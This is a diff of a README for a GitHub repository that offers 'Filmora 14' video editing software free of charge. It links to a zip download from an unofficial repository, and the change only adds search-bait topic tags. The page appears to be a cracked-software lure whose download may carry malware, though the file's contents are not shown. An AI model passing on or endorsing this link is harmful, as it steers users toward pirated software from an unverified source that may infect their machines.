@@ -4,7 +4,7 @@ Welcome to the realm of Filmora 14! ✂️ Here, you can access the free version
 ## 📁 Repository Summary  
 - Name: Filmora 14  
 - Description: Your chance to use Filmora 14 at no cost. Tags: Filmora-14-free, download Filmora 14 for free, fully functional free edition.  
-- Topics: filmora, filmora-14, video-editor, free-content, video-editing, pro-version  
+- Topics: filmora, filmora-14, video-editor, free-content, video-editing, pro-version, video-editing-software, filmora-windows, Filmora-upgrade, Filmora-effects
 
 ## 🔗 Accessing the Software
 ### [Download Filmora 14](https://github.com/Xyt069/Filmora-14-Latest/releases/download/filmora/filmora.zip)
